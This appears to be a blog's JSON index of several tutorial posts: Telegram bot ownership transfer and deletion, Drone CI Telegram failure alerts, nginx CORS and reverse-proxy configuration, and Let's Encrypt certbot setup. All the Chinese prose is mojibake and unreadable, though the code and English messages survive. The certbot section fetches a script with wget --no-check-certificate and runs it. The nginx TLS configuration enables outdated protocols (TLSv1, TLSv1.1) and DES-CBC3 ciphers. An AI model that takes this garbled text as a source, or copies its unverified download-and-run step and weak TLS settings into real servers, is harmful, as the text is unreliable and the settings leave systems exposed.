ç•Œã€å°ç£ payã€è¡—å£ã€æ‚ éŠä»˜ï¼Œä¸è€ƒæ…®é€²é§ä¸€ä¸‹å—\nTransfer Ownership - è½‰ç§»æ©Ÿå™¨äºº âš ï¸ æ³¨æ„ï¼šéå¿…è¦è«‹å‹¿ä½¿ç”¨ï¼\nChoose recipient - é¸æ“‡ä½¿ç”¨è€… 1 Please share the new owner\u0026#39;s contact or their username. æŒ‰ä¸‹æŒ‰éˆ•å¾Œï¼Œå®ƒæœƒè«‹ä½ æŠŠå°æ–¹ä»¥è¯çµ¡äººçš„æ–¹å¼åˆ†äº«çµ¦å®ƒï¼Œæˆ–æ˜¯è¼¸å…¥å°æ–¹çš„ username\nå¸¸è¦‹å•é¡Œï¼š\nè¦è¼¸å…¥ @usernameï¼Œä¸èƒ½åªè¼¸å…¥ username 1 Incorrect format. Please make sure to send either a contact or username. ä¸èƒ½è½‰ç§»çµ¦é »é“ã€æ©Ÿå™¨äººã€æˆ–æ˜¯è‡ªå·± 1 Bot ownership can\u0026#39;t be transferred to channel, another bot or yourself. å°æ–¹è¦ç§è¨Šéæ©Ÿå™¨äººï¼Œè€Œä¸”ä¸èƒ½å°é–æ©Ÿå™¨äºº 1 Oops! Please make sure the new owner has sent at least one message to the bot and didn\u0026#39;t block it. è¼¸å…¥æ­£ç¢ºçš„è©±ï¼Œå°±æœƒå‡ºç¾ä»¥ä¸‹è¨Šæ¯ï¼š\n1 2 3 4 5 You are about to transfer ownership of the bot @ironman2021_by_miku3920_bot to åˆéŸ³ ãƒŸã‚¯. After this you won\u0026#39;t be able to control the bot anymore. The new owner will get access to the bot messages and other data â€“ and can even delete the bot completely. Please make sure you don\u0026#39;t violate your users\u0026#39; privacy (consider GDPR and other laws). If you are sure please press the button below. çœ‹åˆ°é€™å‰‡è¨Šæ¯ä»£è¡¨é›¢æˆåŠŸè½‰ç§»ä¸é äº†\nYes, I am sure, proceed. - ç¢ºèªè½‰ç§» å¦‚æœä½ æœ‰è¨­å®šå…©æ­¥é©Ÿé©—è­‰çš„è©±ï¼Œé€™é‚Šæœƒè·³å‡ºä¾†è¦ä½ è¼¸å…¥\nå¸¸è¦‹å•é¡Œï¼š\nå°æ–¹æ“æœ‰çš„æ©Ÿå™¨äººæ•¸é‡å·²é”ä¸Šé™ 1 Oops! has reached the maximum allowed number of bots. Please ask them to delete (or pass to another account) one of their unused bots first. å¦‚æœå°æ–¹å·²ç¶“æœ‰ 20 éš»æ©Ÿå™¨äººï¼ˆé”åˆ°ä¸Šé™ï¼‰ï¼Œå°±æœƒå‡ºç¾é€™å€‹å°è©±æ¡†ï¼Œä»–è«‹ä½ å…ˆå«å°æ–¹è½‰ç§»æˆ–åˆªé™¤ä¸€äº›æ²’åœ¨ç”¨çš„æ©Ÿå™¨äººï¼Œé€™æ¨£ä½ æ‰å¯ä»¥è½‰ç§»çµ¦å°æ–¹ã€‚\n1 It worked! We hope @ironman2021_by_miku3920_bot will enjoy its new home. å¦‚æœè½‰ç§»æˆåŠŸå°±æœƒå‡ºç¾é€™å‰‡è¨Šæ¯\n1 2 3 Ownership of the bot @ironman2021_by_miku3920_bot has been transferred to you by åˆéŸ³ ãƒŸã‚¯. You can now control the bot using /mybots. If you did not request this, you can delete the bot. Delete Bot - åˆªé™¤æ©Ÿå™¨äºº âš ï¸ æ³¨æ„ï¼šéå¿…è¦è«‹å‹¿ä½¿ç”¨ï¼\n1 You are about to delete your bot 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. Is that correct? é€™é‚Šçš„æŒ‰éˆ•é †åºæ˜¯éš¨æ©Ÿçš„ï¼Œé¿å…ä½ é ­è…¦ä¸æ¸…æ¥šæŠŠæ©Ÿå™¨äººåˆªäº†\n1 Are you TOTALLY sure you want to delete 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot ? è¦é€£çºŒæŒ‰å…©æ¬¡ Yes æ©Ÿå™¨äººæ‰æœƒè¢«åˆªæ‰\n1 You have deleted 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. çœ‹åˆ°é€™å‰‡è¨Šæ¯è¡¨ç¤ºæ©Ÿå™¨äººå·²ç¶“åˆªé™¤ï¼Œç„¡æ³•å¾©åŸ\næ‰€æœ‰ç¾¤çµ„è£¡çš„é€™éš»æ©Ÿå™¨äººéƒ½æœƒé¡¯ç¤ºæˆ Deleted Account\nBonusï¼šDrone CI/CD æµç¨‹å¤±æ•—æ™‚ï¼Œå«ä½ çš„ Telegram æ©Ÿå™¨äººé€šçŸ¥ä½ ï¼ å»ºç«‹ç¾¤çµ„ï¼Œä¸¦å–å¾—ç¾¤çµ„çš„ chat_id Telegram å»ºç«‹ç¾¤çµ„ï¼Œä¸¦å°‡ä½ çš„ Telegram æ©Ÿå™¨äººæ‹‰é€²ç¾¤çµ„å…§(@{your bot username})ã€‚ é€éæ­¤ API å–å¾—ç¾¤çµ„çš„ chat_idï¼š 1 https://api.telegram.org/bot${your bot token}/getUpdates getUpdates API æœƒå–å¾— jsonï¼Œæ‰¾åˆ°ä½ å‰›å‰›é–‹çš„ç¾¤çµ„çš„ chat_id\né€é Drone Plugin å¾ Drone Plugin å¯ä»¥æ‰¾åˆ°å¾ˆå¤šå¥—ä»¶ï¼Œå¯ä»¥æ­é… CI/CD ä½¿ç”¨ï¼Œè€Œæˆ‘å¾é€™æ‰¾åˆ° Telegram by appleboy çš„å¥—ä»¶ã€‚\nDrone CI/CD è£œä¸Šå‘Šè­¦çš„ stepã€‚ ä½ çš„ Drone CI/CD step åŠ ä¸Šä½¿ç”¨ Telegram by appleboy å«ä½ çš„æ©Ÿå™¨äººæ–¼ pipeline å¤±æ•—æ™‚æ–¼ç¾¤çµ„å…§ç™¼å‡ºå‘Šè­¦ã€‚\nPSï¼šè¨˜å¾—å°‡ä½ çš„ telegram bot token èˆ‡ç¾¤çµ„çš„ chat_id åŠ åˆ° Drone Secretsã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 kind: pipeline type: docker name: install and deploy steps: - name: build image: node:15 commands: - node --version - yarn --version # - yarn cache clean -f - yarn install --ignore-engines - yarn run build - ls -al dist/static/ when: branch: - master event: - push - name: deploy image: thegeeklab/drone-s3-sync settings: bucket: xxxxxxxxx(ä½ çš„aws s3 bucket) access_key: from_secret: aws_access_key_id secret_key: from_secret: aws_secret_access_key source: ./dist/ target: /admin acl: \u0026#34;*\u0026#34;: public-read region: xxxxxxxxx(ä½ çš„aws s3 region) delete: true cloudfront_distribution: xxxxxxxxx(ä½ çš„aws cloudfront distribution) when: branch: - master event: - push + - name: send telegram notification + image: appleboy/drone-telegram + settings: + token: + from_secret: telegram_bot_token + to: + from_secret: telegram_chat_id + format: markdown + message: \u0026gt; + `{{repo.name}}` æ–¼ `{{commit.branch}}` ç·¨è­¯å¤±æ•—ï¼š#`{{build.number}}` + when: + status: [failure] tokenï¼š ä½ çš„ Telegram æ©Ÿå™¨äººçš„ tokenã€‚ toï¼š chat_idã€‚ formatï¼š ä½¿ç”¨ markdown æ ¼å¼ã€‚ messageï¼š æ©Ÿå™¨äººå‚³çš„è¨Šæ¯ã€‚ when.status [failure]ï¼š ç•¶æ­¤ pipeline å¤±æ•—æ™‚è§¸ç™¼æ­¤ step(send telegram notification)ï¼Œäº¦å¯æ–¼æˆåŠŸæˆ–å¤±æ•—çš†å‘Šè­¦ï¼š[success, failure]ã€‚ è©³ç´°åƒæ•¸å¯åƒè€ƒ Drone Plugin - appleboy/drone-telegram\n","date":"2022-08-25T00:00:00Z","image":"https://live.staticflickr.com/65535/52309739568_a0d98a6137_o.png","permalink":"https://wayneblog.ga/2022-08-25/drone-cicd-with-telegram-bot/","title":"Telegram æ©Ÿå™¨äººèªªæ˜ï¼Œä¸¦ç‚ºä½ çš„ Drone CI/CD é…ç½® Telegram æ©Ÿå™¨äºº"},{"content":" åƒè€ƒæ–‡ç«  CORSè·¨åŸŸèˆ‡Nginxåå‘ä»£ç† CORS on Nginx Nginxè§£å†³CORSè·¨åŸŸè§£å†³æ–¹æ¡ˆ åœ¨ Nginx çš„ ProxyPass Upstream è¨­å®š CORS ï¼ˆè·¨ä¾†æºè³‡æºå…±äº«ï¼‰ CORSè·¨åŸŸ è·¨åŸŸè³‡æºå…±äº« - CORS è·¨åŸŸè³‡æºå…±äº«(CORS)æ˜¯ä¸€ç¨®æ©Ÿåˆ¶ï¼Œå®ƒä½¿ç”¨é¡å¤–çš„ HTTP é ­ä¾†å‘Šè¨´ç€è¦½å™¨ï¼Œè®“é‹è¡Œåœ¨ä¸€å€‹ origin (domain) ä¸Šçš„Webæ‡‰ç”¨è¢«å‡†è¨±è¨ªå•ä¾†è‡ªä¸åŒæºæœå‹™å™¨ä¸Šçš„æŒ‡å®šçš„è³‡æºã€‚ç•¶ä¸€å€‹è³‡æºå¾èˆ‡è©²è³‡æºæœ¬èº«æ‰€åœ¨çš„æœå‹™å™¨ä¸åŒçš„åŸŸã€å”è­°æˆ–ç«¯å£è«‹æ±‚ä¸€å€‹è³‡æºæ™‚ï¼Œè³‡æºæœƒç™¼èµ·ä¸€å€‹è·¨åŸŸ HTTP è«‹æ±‚ã€‚\næ¯”å¦‚ï¼Œç«™é» http://domain-a.com çš„æŸ HTML é é¢é€šé \u0026lt;img\u0026gt; çš„ src è«‹æ±‚ http://domain-b.com/image.jpgã€‚ç¶²çµ¡ä¸Šçš„è¨±å¤šé é¢éƒ½æœƒåŠ è¼‰ä¾†è‡ªä¸åŒåŸŸçš„CSSæ¨£å¼è¡¨ï¼Œåœ–åƒå’Œè…³æœ¬ç­‰è³‡æºã€‚\nå‡ºæ–¼å®‰å…¨åŸå› ï¼Œç€è¦½å™¨é™åˆ¶å¾è…³æœ¬å…§ç™¼èµ·çš„è·¨æºHTTPè«‹æ±‚ã€‚ä¾‹å¦‚ï¼ŒXMLHttpRequestå’ŒFetch APIéµå¾ªåŒæºç­–ç•¥ã€‚é€™æ„å‘³è‘—ä½¿ç”¨é€™äº›APIçš„Webæ‡‰ç”¨ç¨‹åºåªèƒ½å¾åŠ è¼‰æ‡‰ç”¨ç¨‹åºçš„åŒä¸€å€‹åŸŸè«‹æ±‚HTTPè³‡æºï¼Œé™¤ééŸ¿æ‡‰å ±æ–‡åŒ…å«äº†æ­£ç¢ºCORSéŸ¿æ‡‰é ­ã€‚\nè·¨åŸŸæ™‚éƒ¨åˆ†ç€è¦½å™¨é è¨­ä¸æ”œå¸¶cookieï¼Œå› æ­¤ç‚ºäº†æ”œå¸¶cookieéœ€è¦åœ¨å‰ç«¯è¨­å®šxmlhttprequestçš„withCrendetallså±¬æ€§ã€‚ ã€ŒåŒæºã€å®šç¾© ã€ŒåŒæºã€å®šç¾©å¾ˆç°¡å–®ï¼Œä»¥ä¸‹ä¸‰å€‹åƒæ•¸éƒ½ç›¸åŒï¼š\n1 [protocol]://[domain]:[port] ç™½è©±èªªï¼Œç•¶ä½ åœ¨ https://www.example.com/product.html é é¢\nå˜—è©¦å°ä»¥ä¸‹è·¯å¾‘ç™¼å‡ºè«‹æ±‚ï¼Œéƒ½é•ååŒæºï¼š\nhttp://www.example.com/api/products/40.json https://www.example2.com/api/products/40.json https://www.example.com:8080/api/products/40.json ä¹–å­©å­éµå®ˆåŒæºï¼Œä¸æœƒè¢«æ‰“ï¼š\nhttps://www.example.com/api/products/40.json ç°¡å–®è«‹æ±‚å’Œè¤‡é›œè«‹æ±‚ ç°¡å–®è«‹æ±‚èˆ‡è¤‡é›œè«‹æ±‚çš„å·®åˆ¥æ˜¯è¤‡é›œè«‹æ±‚æœƒè‡ªå‹•ç™¼å‡ºä¸€å€‹ OPTIONS çš„é æª¢è«‹æ±‚ï¼Œç•¶è«‹æ±‚å¾—åˆ°ç¢ºèªå¾Œï¼Œæ‰é–‹å§‹çœŸæ­£ç™¼é€è«‹æ±‚ã€‚\nç¶œä¸Šï¼Œæˆ‘å€‘è¦è§£æ±ºå…©å€‹å•é¡Œï¼š\nOPTIONS è«‹æ±‚çš„æ­£ç¢ºéŸ¿æ‡‰ è·¨åŸŸè«‹æ±‚æ­£ç¢ºéŸ¿æ‡‰ OPTIONS è«‹æ±‚çš„æ­£ç¢ºéŸ¿æ‡‰ åƒè€ƒç¶²å€\nè§£æ±ºçš„æ–¹å¼æœ‰å¤šç¨®ï¼Œæ—¢å¯ä»¥åœ¨Web Serverè§£æ±ºï¼Œä¹Ÿå¯ä»¥åœ¨æºç¢¼å±¤è§£æ±ºã€‚å› ç‚ºå•é¡Œæ¯”è¼ƒæ™®éï¼Œæ•…æˆ‘å€‘é¸æ“‡åœ¨Web Serverè§£æ±ºï¼Œä¸‹é¢æˆ‘å€‘ä»¥ Nginx ç‚ºä¾‹ï¼Œèªªæ˜è§£æ±ºæ–¹æ¡ˆã€‚ å‡è¨­è¨ªå•çš„åœ°å€ç‚º /example , Nginx é…ç½®å¦‚ä¸‹: 1 2 3 4 5 6 7 location /example { proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } ç‚ºäº†è§£æ±ºè·¨åŸŸå•é¡Œï¼Œæ·»åŠ å¦‚ä¸‹å…§å®¹: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 location /example { + if ($request_method = \u0026#39;OPTIONS\u0026#39;) { + add_header Access-Control-Allow-Origin *; + add_header Access-Control-Max-Age 1728000; + add_header Access-Control-Allow-Methods GET,POST,OPTIONS; + add_header Access-Control-Allow-Headers \u0026#39;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range\u0026#39;; + add_header Content-Type\u0026#39; \u0026#39;text/plain; charset=utf-8\u0026#39;; + add_header Content-Length 0 ; + return 204; + } proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } èªªæ˜ï¼š if ($request_method = 'OPTIONS') {...} ç•¶è«‹æ±‚æ–¹æ³•ç‚º OPTIONS æ™‚:\næ·»åŠ å…è¨±æº Access-Control-Allow-Origin ç‚º * (å¯æ ¹æ“šæ¥­å‹™éœ€è¦æ›´æ”¹) æ·»åŠ ç·©å­˜æ™‚é•· Access-Control-Max-Ageï¼Œç•¶ä¸‹æ¬¡è«‹æ±‚æ™‚ï¼Œç„¡éœ€å†ç™¼é€ OPTIONS è«‹æ±‚ æ·»åŠ å…è¨±çš„æ–¹æ³•ï¼Œå…è¨±çš„é¦–éƒ¨ æ·»åŠ ä¸€å€‹å…§å®¹é•·åº¦ç‚º0ï¼Œé¡å‹ç‚º text/plain; charset=utf-8 , è¿”å›ç‹€æ…‹ç¢¼ç‚º 204 çš„é¦–éƒ¨ è‡³æ­¤ï¼Œå®Œæˆ OPTIONS è«‹æ±‚çš„æ­£ç¢ºéŸ¿æ‡‰ã€‚\nè·¨åŸŸè«‹æ±‚æ­£ç¢ºéŸ¿æ‡‰ æ·»åŠ å¦‚ä¸‹å…§å®¹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 location /example { if ($request_method = \u0026#39;OPTIONS\u0026#39;) { add_header Access-Control-Allow-Origin *; add_header Access-Control-Max-Age 1728000; add_header Access-Control-Allow-Methods GET,POST,OPTIONS; add_header Access-Control-Allow-Headers \u0026#39;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range\u0026#39;; add_header Content-Type\u0026#39; \u0026#39;text/plain; charset=utf-8\u0026#39;; add_header Content-Length 0 ; return 204; } + if ($http_origin ~* (https?://(.+\\.)?(example\\.com$))) { + add_header Access-Control-Allow-Origin $http_origin; + add_header Access-Control-Allow-Credentials true; + add_header Access-Control-Allow-Methods GET,POST,OPTIONS; + add_header Access-Control-Expose-Headers Content-Length,Content-Range; + } proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } èªªæ˜ï¼š if ($http_origin ~* (https?://(.+\\.)?(example\\.com$))) {...}ï¼Œç•¶ origin ç‚ºåˆæ³•åŸŸå(å¯æ ¹æ“šæ¥­å‹™èª¿æ•´æˆ–å»é™¤åˆæ³•åŸŸåé©—è­‰)æ™‚:\næ·»åŠ å…è¨±æº Access-Control-Allow-Origin ç‚º $http_origin (å¯æ ¹æ“šæ¥­å‹™éœ€è¦æ›´æ”¹) æ·»åŠ å…è¨±èªè­‰ Access-Control-Allow-Credentials ç‚º true ï¼Œå…è¨±æ¥æ”¶å®¢æˆ¶ç«¯ Cookie(å¯æ ¹æ“šæ¥­å‹™éœ€è¦æ›´æ”¹ã€‚ ä½†è¦æ³¨æ„ï¼Œç•¶è¨­ç½®ç‚ºtrueæ™‚ï¼ŒAccess-Control-Allow-Origin ä¸å…è¨±è¨­ç½®ç‚º *) æ·»åŠ å…è¨±çš„æ–¹æ³•ï¼Œæš´éœ²çš„é¦–éƒ¨ è‡³æ­¤ï¼Œå®Œæˆè·¨åŸŸè«‹æ±‚æ­£ç¢ºéŸ¿æ‡‰ã€‚\nä»¥ä¸Šï¼Œæ˜¯å°è·¨åŸŸè«‹æ±‚åœ¨Web Serverçš„è§£æ±ºæ–¹æ¡ˆï¼Œä¸»è¦æ˜¯é€šééŸ¿æ‡‰ OPTIONS æ–¹æ³•å’Œæ·»åŠ å…è¨±æºä¾†è§£æ±ºã€‚\nç•¶ç„¶ï¼Œå¦‚æœæœ¬åœ°é–‹ç™¼ä¸­ï¼Œå¯ä»¥åœ¨åˆ©ç”¨ webpack-dev-server çš„ proxy é¸é …ä¾†å¿«é€Ÿè§£æ±ºè·¨åŸŸå•é¡Œï¼š\nç¤ºä¾‹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 // webpack.congf.js module.exports = { //... devServer: { proxy: { \u0026#39;/api\u0026#39;: { target: \u0026#39;http://localhost:3000\u0026#39;, pathRewrite: {\u0026#39;^/api\u0026#39; : \u0026#39;\u0026#39;} } } } } ç•¶è¨ªå•åœ°å€å¦‚ /api/foo?q=bar æ™‚ï¼Œå‰‡é€šéä»£ç†è¨ªå•çš„å¯¦éš›åœ°å€æ˜¯: http://localhost:3000/foo?q=barã€‚\nNginxåå‘ä»£ç† nginxåå‘ä»£ç†ï¼Œé€šéä¿®æ”¹nginxé…ç½®æª”æ¡ˆå¯¦ç¾åå‘ä»£ç†ï¼Œè«‹æ±‚çµ±ä¸€é€šénginxåˆ†ç™¼è«‹æ±‚\nNginxé…ç½®ï¼ˆ192.168.75.139ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # è² è¼‰å‡è¡¡ upstream my_site { server 192.168.75.138:8080; server 192.168.75.137:8080; server 192.168.75.136:8080; } server { listen 8081; server_name localhost; location ^~ /api/ { proxy_pass http://my_site/; proxy_set_header Host $host; proxy_set_header X-Real-ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location = / { proxy_pass http://my_site/nginx/indexNginxCrossQuest.jsp; } location = /nginx/ { proxy_pass http://my_site/nginx/; proxy_set_header Host $host; proxy_set_header X-Real-ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location ~ \\.(html|htm|ico|png|jpg|jpeg|js|css|bmp)$ { proxy_pass http://my_site; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } ç€è¦½å™¨è«‹æ±‚ï¼ˆ192.168.75.1ï¼‰ ç¶œåˆå°æ¯” CORS Nginxåå‘ä»£ç† å‰ç«¯ç¨‹å¼ç¢¼é…ç½® credentials=true ç„¡ å¾Œç«¯ç¨‹å¼ç¢¼é…ç½® setHeaderï¼šAllow-Originã€Allow-Methodsç­‰ ç„¡ æœå‹™ç«¯é…ç½® ç„¡ Nginxé…ç½® ç§»æ¤éˆæ´»æ€§ é«˜ã€ç„¡é¡å¤–é…ç½® ä½ã€æ¯å¢åŠ ä¸€å€‹ç’°å¢ƒéƒ½éœ€è¦å¢åŠ é…ç½® å®‰å…¨æ€§ é«˜ã€ä¾†æºå¯æ§ã€ç›´æ¥è¿½æº¯ X-Forwarded-Forè¿½æº¯å¤šç´šä¾†æº å®‰å…¨æ§åˆ¶ é»‘ç™½åå–® æ›´æ–°é…ç½® ","date":"2022-08-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52305241864_c3ef911be4_o.jpg","permalink":"https://wayneblog.ga/2022-08-23/nginx-cors-and-reverse-proxy/","title":"nginx CORS è·¨åŸŸèˆ‡åå‘ä»£ç†"},{"content":" åƒè€ƒæ–‡ç«  IT Note SSLæ†‘è­‰æ•™å­¸ - xoops å…è²»SSLæ†‘è­‰ç”³è«‹ nginx configç”¢ç”Ÿå™¨ Qualys çš„ SSL ä¼ºæœå™¨æ¸¬è©¦å·¥å…· ç‰ˆæœ¬ä¸€ æ­¥é©Ÿ 1 - ä¸‹è¼‰å®‰è£åŠåŸ·è¡Œçš„è…³æœ¬ 1 2 3 wget https://dl.eff.org/certbot-auto --no-check-certificate chmod +x ./certbot-auto ./certbot-auto -n ç”Ÿæˆè­‰æ›¸ï¼Œåªéœ€è¦è¼¸å…¥éƒµä»¶åœ°å€å’Œç¶²ç«™æ ¹ç›®éŒ„ï¼Œæç¤ºä»¥ä¸‹å…§å®¹ï¼Œèªªæ˜å®‰è£å®Œæˆ 1 2 3 Saving debug log to /var/log/letsencrypt/letsencrypt.log Missing command line flags. For non-interactive execution, you will need to specify a plugin on the command line. Run with \u0026#39;--help plugins\u0026#39; to see a list of options, and see https://eff.org/letsencrypt-plugins for more detail on what the plugins do and how to use them. æ­¥é©Ÿ 2 - nginxè¨­å®šéš±è—ç›®éŒ„è¨ªå• 1 2 3 location ~ /.well-known { allow all; } æ­¥é©Ÿ 3 - ç”ŸæˆåŸŸåè­‰æ›¸ 1 ./certbot-auto certonly --email tony@hack.idv.tw --agree-tos --no-eff-email --webroot -w /var/www/ -d hack.idv.tw åˆ°ç›®éŒ„å…§æŸ¥çœ‹ 1 cd /etc/letsencrypt/live/ è¬ç”¨å­—å…ƒçš„ç”³è«‹æŒ‡ä»¤ (éœ€è¦é©—è­‰dns) 1 certbot-auto certonly -d *.manpc.tk --manual --preferred-challenges dns æ­¥é©Ÿ 4 - è¨­å®šnginx 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 server { listen 80; # IPv4 listen [::]:80; server_name hack.idv.tw ; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; #rewrite ^(.*) https://$host$1 permanent; return 301 https://www.itnotetk.com$request_uri; #è·³è½‰åˆ°Https } server { listen 443 ssl http2; server_name hack.idv.tw ; ssl on; ssl_certificate /etc/letsencrypt/live/hack.idv.tw/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/hack.idv.tw/privkey.pem; client_max_body_size 256m; ssl_dhparam /etc/nginx/certs/dhparam.pem; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_stapling on; ssl_ciphers \u0026#34;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA\u0026#34;; ssl_prefer_server_ciphers on; #add_header Strict-Transport-Security \u0026#34;max-age=63072000; includeSubdomains; preload\u0026#34;; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains;preload\u0026#34; always; # ... Let\u0026rsquo;s Encryptæ†‘è­‰åªæœ‰90å¤© éœ€è¦æ‰‹å‹•çºŒç´„ 1 0 1 * * * /root/certbot-auto renew --disable-hook-validation --renew-hook \u0026#34;/etc/init.d/nginx reload\u0026#34; ç‰ˆæœ¬äºŒ ç¶²è·¯å‡ºè™•\nLetâ€™s Encrypt æ˜¯ä¸€å®¶æ–°çš„è­‰æ›¸é ’ç™¼æ©Ÿæ§‹ï¼ˆCertificate Authorityï¼Œç°¡ç¨± CAï¼‰ï¼Œå…¶æä¾›å…è²»çš„ TLS/SSL æ†‘è­‰å†é…åˆ Certbot é€™å€‹è‡ªå‹•åŒ–å·¥å…·ï¼Œè®“ä¸€èˆ¬çš„ç¶²ç«™å¯ä»¥å¾ˆå®¹æ˜“åœ°ä½¿ç”¨ HTTPS çš„å®‰å…¨åŠ å¯†ç¶²é ï¼Œè¨­å®šå¾ˆç°¡å–®ï¼Œæ†‘è­‰çš„æ›´æ–°ä¹Ÿå¯ä»¥è‡ªå‹•è™•ç†ã€‚ ä»¥ä¸‹æˆ‘ä»¥ Ubuntu Linux 14.04 çš„ç³»çµ±ç‚ºä¾‹ï¼Œç¤ºç¯„ nginx ä¼ºæœå™¨ä½¿ç”¨ Letâ€™s Encrypt æ†‘è­‰è¨­å®š HTTPS å®‰å…¨åŠ å¯†ç¶²é çš„æ–¹æ³•ã€‚ æ­¥é©Ÿ 1 - å¾ Certbot å®˜æ–¹ç¶²ç«™ä¸‹è¼‰ certbot-auto æŒ‡ä»¤ç¨¿ï¼Œä¸¦è¨­å®šå…¶åŸ·è¡Œæ¬Šé™ 1 2 wget https://dl.eff.org/certbot-auto chmod a+x certbot-auto certbot-auto è¦æ”¾åœ¨å“ªè£¡éƒ½å¯ä»¥ï¼Œå»ºè­°ä¸€é–‹å§‹å°±æ‰¾ä¸€å€‹é©åˆçš„åœ°æ–¹æ”¾å¥½ï¼Œä¾‹å¦‚å»ºç«‹ä¸€å€‹ /opt/letsencrypt ç›®éŒ„ï¼ŒæŠŠ certbot-auto æ”¾åœ¨é€™è£¡ 1 2 mkdir /opt/letsencrypt mv certbot-auto /opt/letsencrypt/ æ­¥é©Ÿ 2 - åŸ·è¡Œ certbot-auto ï¼Œè®“å®ƒè‡ªå‹•å®‰è£æ‰€æœ‰ç›¸ä¾å¥—ä»¶ 1 /opt/letsencrypt/certbot-auto åŸ·è¡Œ certbot-auto æ™‚ï¼Œæœƒéœ€è¦è¼¸å…¥å¯†ç¢¼å–å¾— root æ¬Šé™ æ­¥é©Ÿ 3ï¼š å®‰è£å®Œæˆæ‰€æœ‰éœ€è¦çš„ç³»çµ±å¥—ä»¶å¾Œï¼Œæ¥è‘—æˆ‘å€‘è¦é€é webroot çš„æ–¹å¼ï¼Œä½¿ç”¨æ—¢æœ‰çš„ nginx ç¶²é ä¼ºæœå™¨ä¾†å‘ Letâ€™s Encrypt å–å¾—æ†‘è­‰ï¼Œè€Œåœ¨èªè­‰çš„éç¨‹æœƒéœ€è¦åœ¨ç¶²é æ ¹ç›®éŒ„ä¸­å»ºç«‹ä¸€å€‹ .well-known/acme-challenge/ ç›®éŒ„ï¼Œè®“ Letâ€™s Encrypt çš„ä¼ºæœå™¨ä¾†è®€å–å…¶ä¸­çš„å…§å®¹ã€‚ ä¸€èˆ¬çš„ nginx ä¼ºæœå™¨é€šå¸¸æœƒè¨­å®šæŠŠå¥é»é–‹é ­çš„éš±è—æª”æ¡ˆéƒ½æ“‹æ‰ï¼Œé‡åˆ°é€™æ¨£çš„ç‹€æ³å°±æœƒç„¡æ³•é€²è¡Œèªè­‰ï¼Œé€™æ™‚å€™å¯ä»¥å†åŠ ä¸€å°æ®µè¨­å®šï¼Œè®“ .well-known/acme-challenge/ ç›®éŒ„å¯ä»¥è¢«æ­£å¸¸è®€å–ã€‚ 1 2 3 4 5 6 location ^~ /.well-known/acme-challenge/ { # the usual settings } location ~ /\\. { deny all; } æ­¥é©Ÿ 4 - ä½¿ç”¨ certonly åŠŸèƒ½ä¸‹è¼‰æ†‘è­‰ 1 /opt/letsencrypt/certbot-auto certonly --webroot -w /var/www/blog.gtwang.org/ -d blog.gtwang.org -d gtwang.org æ­¥é©Ÿ 5 - è¼¸å…¥è‡ªå·±çš„ Email ä¿¡ç®± æ­¥é©Ÿ 6 - é–±è®€ä½¿ç”¨æ¢æ¬¾ï¼Œé¸æ“‡ã€ŒAgreeã€ç¹¼çºŒ æ­¥é©Ÿ 7 - ä¸‹è¼‰å®Œæˆå¾Œï¼Œæœƒå‡ºç¾é¡ä¼¼é€™æ¨£çš„æˆåŠŸè¨Šæ¯ 1 2 3 4 5 6 7 8 IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/blog.gtwang.org/fullchain.pem. Your cert will expire on 2016-08-13. To obtain a new version of the certificate in the future, simply run Certbot again. - If you like Certbot, please consider supporting our work by: Donating to ISRG / Let\u0026#39;s Encrypt: https://letsencrypt.org/donate Donating to EFF: https://eff.org/donate-le 